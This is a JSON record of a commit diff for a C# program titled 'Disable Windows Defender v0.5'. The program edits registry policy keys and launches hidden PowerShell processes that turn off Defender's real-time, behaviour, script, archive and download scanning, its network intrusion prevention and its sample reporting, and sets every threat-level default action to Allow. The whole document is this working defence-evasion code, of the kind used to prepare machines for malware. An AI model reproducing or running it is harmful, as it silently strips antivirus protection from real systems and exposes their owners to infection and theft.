{
    "hash": "ce5677b7fddae829e5b93d445d5485f9768cb3f1",
    "message": "Update Program.cs",
    "file_num_lines": 97,
    "diff_parsed": {
        "added": [
            [
                8,
                "//       \u2502 Name       : Disable Windows Defender v0.5"
            ],
            [
                22,
                "            RegistryEdit(@\"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\", \"DisableBehaviorMonitoring\", \"1\");"
            ],
            [
                26,
                "            CheckDefender();"
            ],
            [
                31,
                "            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))"
            ],
            [
                33,
                "                if (key == null)"
            ],
            [
                35,
                "                    Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);"
            ],
            [
                36,
                "                    return;"
            ],
            [
                38,
                "                if (key.GetValue(name) != (object)value)"
            ],
            [
                39,
                "                    key.SetValue(name, value, RegistryValueKind.DWord);"
            ],
            [
                43,
                "        private static void CheckDefender()"
            ],
            [
                45,
                "            Process proc = new Process"
            ],
            [
                47,
                "                StartInfo = new ProcessStartInfo"
            ],
            [
                48,
                "                {"
            ],
            [
                49,
                "                    FileName = \"powershell\","
            ],
            [
                50,
                "                    Arguments = \"Get-MpPreference -verbose\","
            ],
            [
                51,
                "                    UseShellExecute = false,"
            ],
            [
                52,
                "                    RedirectStandardOutput = true,"
            ],
            [
                53,
                "                    WindowStyle = ProcessWindowStyle.Hidden,"
            ],
            [
                54,
                "                    CreateNoWindow = true"
            ],
            [
                55,
                "                }"
            ],
            [
                56,
                "            };"
            ],
            [
                57,
                "            proc.Start();"
            ],
            [
                58,
                "            while (!proc.StandardOutput.EndOfStream)"
            ],
            [
                59,
                "            {"
            ],
            [
                60,
                "                string line = proc.StandardOutput.ReadLine();"
            ],
            [
                61,
                ""
            ],
            [
                62,
                "                if (line.Contains(@\"DisableRealtimeMonitoring\") && line.Contains(\"False\"))"
            ],
            [
                63,
                "                    RunPS(\"Set-MpPreference -DisableRealtimeMonitoring $true\"); //real-time protection"
            ],
            [
                64,
                ""
            ],
            [
                65,
                "                else if (line.Contains(@\"DisableBehaviorMonitoring\") && line.Contains(\"False\"))"
            ],
            [
                66,
                "                    RunPS(\"Set-MpPreference -DisableBehaviorMonitoring $true\"); //behavior monitoring"
            ],
            [
                67,
                ""
            ],
            [
                68,
                "                else if (line.Contains(@\"DisableBlockAtFirstSeen\") && line.Contains(\"False\"))"
            ],
            [
                69,
                "                    RunPS(\"Set-MpPreference -DisableBlockAtFirstSeen $true\");"
            ],
            [
                70,
                ""
            ],
            [
                71,
                "                else if (line.Contains(@\"DisableIOAVProtection\") && line.Contains(\"False\"))"
            ],
            [
                72,
                "                    RunPS(\"Set-MpPreference -DisableIOAVProtection $true\"); //scans all downloaded files and attachments"
            ],
            [
                73,
                ""
            ],
            [
                74,
                "                else if (line.Contains(@\"DisablePrivacyMode\") && line.Contains(\"False\"))"
            ],
            [
                75,
                "                    RunPS(\"Set-MpPreference -DisablePrivacyMode $true\"); //displaying threat history"
            ],
            [
                76,
                ""
            ],
            [
                77,
                "                else if (line.Contains(@\"SignatureDisableUpdateOnStartupWithoutEngine\") && line.Contains(\"False\"))"
            ],
            [
                78,
                "                    RunPS(\"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true\"); //definition updates on startup"
            ],
            [
                79,
                ""
            ],
            [
                80,
                "                else if (line.Contains(@\"DisableArchiveScanning\") && line.Contains(\"False\"))"
            ],
            [
                81,
                "                    RunPS(\"Set-MpPreference -DisableArchiveScanning $true\"); //scan archive files, such as .zip and .cab files"
            ],
            [
                82,
                ""
            ],
            [
                83,
                "                else if (line.Contains(@\"DisableIntrusionPreventionSystem\") && line.Contains(\"False\"))"
            ],
            [
                84,
                "                    RunPS(\"Set-MpPreference -DisableIntrusionPreventionSystem $true\"); // network protection"
            ],
            [
                85,
                ""
            ],
            [
                86,
                "                else if (line.Contains(@\"DisableScriptScanning\") && line.Contains(\"False\"))"
            ],
            [
                87,
                "                    RunPS(\"Set-MpPreference -DisableScriptScanning $true\"); //scanning of scripts during scans"
            ],
            [
                88,
                ""
            ],
            [
                89,
                "                else if (line.Contains(@\"SubmitSamplesConsent\") && !line.Contains(\"2\"))"
            ],
            [
                90,
                "                    RunPS(\"Set-MpPreference -SubmitSamplesConsent 2\"); //MAPSReporting"
            ],
            [
                91,
                ""
            ],
            [
                92,
                "                else if (line.Contains(@\"MAPSReporting\") && !line.Contains(\"0\"))"
            ],
            [
                93,
                "                    RunPS(\"Set-MpPreference -MAPSReporting 0\"); //MAPSReporting"
            ],
            [
                94,
                ""
            ],
            [
                95,
                "                else if (line.Contains(@\"HighThreatDefaultAction\") && !line.Contains(\"6\"))"
            ],
            [
                96,
                "                    RunPS(\"Set-MpPreference -HighThreatDefaultAction 6 -Force\"); // high level threat // Allow"
            ],
            [
                97,
                ""
            ],
            [
                98,
                "                else if (line.Contains(@\"ModerateThreatDefaultAction\") && !line.Contains(\"6\"))"
            ],
            [
                99,
                "                    RunPS(\"Set-MpPreference -ModerateThreatDefaultAction 6\"); // moderate level threat"
            ],
            [
                100,
                ""
            ],
            [
                101,
                "                else if (line.Contains(@\"LowThreatDefaultAction\") && !line.Contains(\"6\"))"
            ],
            [
                102,
                "                    RunPS(\"Set-MpPreference -LowThreatDefaultAction 6\"); // low level threat"
            ],
            [
                103,
                ""
            ],
            [
                104,
                "                else if (line.Contains(@\"SevereThreatDefaultAction\") && !line.Contains(\"6\"))"
            ],
            [
                105,
                "                    RunPS(\"Set-MpPreference -SevereThreatDefaultAction 6\"); // severe level threat"
            ],
            [
                108,
                ""
            ],
            [
                109,
                "        private static void RunPS(string args)"
            ],
            [
                110,
                "        {"
            ],
            [
                111,
                "            Process proc = new Process"
            ],
            [
                112,
                "            {"
            ],
            [
                113,
                "                StartInfo = new ProcessStartInfo"
            ],
            [
                114,
                "                {"
            ],
            [
                115,
                "                    FileName = \"powershell\","
            ],
            [
                116,
                "                    Arguments = args,"
            ],
            [
                117,
                "                    WindowStyle = ProcessWindowStyle.Hidden,"
            ],
            [
                118,
                "                    CreateNoWindow = true"
            ],
            [
                119,
                "                }"
            ],
            [
                120,
                "            };"
            ],
            [
                121,
                "            proc.Start();"
            ],
            [
                122,
                "        }"
            ],
            [
                123,
                ""
            ]
        ],
        "deleted": [
            [
                8,
                "//       \u2502 Name       : Disable Windows Defender v0.4"
            ],
            [
                19,
                ""
            ],
            [
                23,
                "            RegistryEdit(@\"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\", \"DisableBehaviorMonitoring\",\"1\");"
            ],
            [
                27,
                "            Thread.Sleep(100);"
            ],
            [
                28,
                ""
            ],
            [
                29,
                "            RunPS(\"Set-MpPreference -DisableRealtimeMonitoring $true\"); //real-time protection"
            ],
            [
                30,
                "            RunPS(\"Set-MpPreference -DisableBehaviorMonitoring $true\"); //behavior monitoring"
            ],
            [
                31,
                "            RunPS(\"Set-MpPreference -DisableBlockAtFirstSeen $true\");"
            ],
            [
                32,
                "            RunPS(\"Set-MpPreference -DisableIOAVProtection $true\"); //scans all downloaded files and attachments"
            ],
            [
                33,
                "            RunPS(\"Set-MpPreference -DisablePrivacyMode $true\"); //displaying threat history"
            ],
            [
                34,
                "            RunPS(\"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true\"); //definition updates on startup"
            ],
            [
                35,
                "            RunPS(\"Set-MpPreference -DisableArchiveScanning $true\"); //scan archive files, such as .zip and .cab files"
            ],
            [
                36,
                "            RunPS(\"Set-MpPreference -DisableScriptScanning $true\"); //scanning of scripts during scans"
            ],
            [
                37,
                "            RunPS(\"Set-MpPreference -SubmitSamplesConsent Never\"); //MAPSReporting"
            ],
            [
                38,
                "            RunPS(\"Set-MpPreference -MAPSReporting 0\"); //MAPSReporting"
            ],
            [
                43,
                "            try"
            ],
            [
                45,
                "                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath,RegistryKeyPermissionCheck.ReadWriteSubTree))"
            ],
            [
                47,
                "                    if (key == null)"
            ],
            [
                48,
                "                    {"
            ],
            [
                49,
                "                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);"
            ],
            [
                50,
                "                        return;"
            ],
            [
                51,
                "                    }"
            ],
            [
                52,
                "                    if (key.GetValue(name) != (object)value)"
            ],
            [
                53,
                "                        key.SetValue(name, value, RegistryValueKind.DWord);"
            ],
            [
                56,
                "            catch { }"
            ],
            [
                59,
                "        private static void RunPS(string args)"
            ],
            [
                61,
                "            try"
            ],
            [
                63,
                "                ProcessStartInfo ps = new ProcessStartInfo();"
            ],
            [
                64,
                "                ps.FileName = \"powershell.exe\";"
            ],
            [
                65,
                "                ps.Arguments = args;"
            ],
            [
                66,
                "                ps.WindowStyle = ProcessWindowStyle.Hidden;"
            ],
            [
                67,
                "                Process process = new Process();"
            ],
            [
                68,
                "                process.StartInfo = ps;"
            ],
            [
                69,
                "                process.Start();"
            ],
            [
                71,
                "            catch { }"
            ]
        ]
    },
    "num_lines_added": 86,
    "num_lines_removed": 35
}